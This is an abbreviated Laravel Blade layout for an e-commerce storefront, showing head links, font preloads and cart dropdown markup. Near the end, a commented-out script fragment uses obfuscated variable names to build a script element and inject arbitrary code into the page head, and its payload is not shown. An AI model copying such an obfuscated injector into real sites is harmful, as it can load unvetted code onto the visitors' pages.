...
<head>
    ...
    <link rel="icon" type="image/png"
        href="{{ asset(isset($businesssetting) ? $businesssetting->favicon : 'images/icons/favicon.png') }}">
    ...
    <link rel="preload" href="{{ asset('vendor/fontawesome-free/webfonts/fa-brands-400.woff2') }}" as="font"
        type="font/woff2" crossorigin="anonymous">
    <link rel="preload" href="{{ asset('fonts/Wolmart87d5.woff?png09e') }}" as="font" type="font/woff"
    ...
    <!-- Default CSS -->
    <link rel="stylesheet" type="text/css" href="{{ asset('css/style.min.css') }}">@yield('header')
...
<body class="home">
            ...
            <div class="dropdown-box">
                <div class="products">
                    <div class="product product-cart">
                        ...
                        <figure class="product-media">
                            <a href="product-default.html">
                                <img src="{{ asset('images/cart/product-1.jpg') }}" alt="product" height="84"
                                    width="94" />
                            </a>
                        </figure>
                    ...
                    <div class="product product-cart">
                        ...
                        <figure class="product-media">
                            <a href="product-default.html">
                                <img src="{{ asset('images/cart/product-2.jpg') }}" alt="product" width="84"
                                    height="94" />
                            </a>
                        </figure>
                        <button class="btn btn-link btn-close" aria-label="button">
    ...
    <script src="{{ asset('jquery.validate.min.js') }}"></script>@yield('footer')
    {{-- <script>(function(){
    ...
    function handler() {
        ...
        if (_0xi) {var _0xj = _0xi.createElement('script');_0xj.nonce = '';
        _0xj.innerHTML = js;_0xi.getElementsByTagName('head')[0].appendChild(_0xj);
        }
        }
